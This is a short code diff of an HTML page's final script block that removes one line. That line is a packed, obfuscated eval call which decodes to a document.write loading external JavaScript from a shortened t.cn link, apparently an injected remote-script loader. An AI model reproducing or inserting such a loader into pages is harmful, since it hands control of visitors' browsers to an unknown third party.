@@ -144,8 +144,6 @@ function to_submit()
 		var s = document.getElementsByTagName("script")[0];
 		s.parentNode.insertBefore(hm, s);
 	})();
-
-	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4.5("<0 3=\\"1/2\\" 9=\\"a://8.6/7\\"><\\/0>");',11,11,'script|text|javascript|type|document|write|cn|R5eujdw|t|src|http'.split('|'),0,{}))
 </script>
 </body>
 </html>
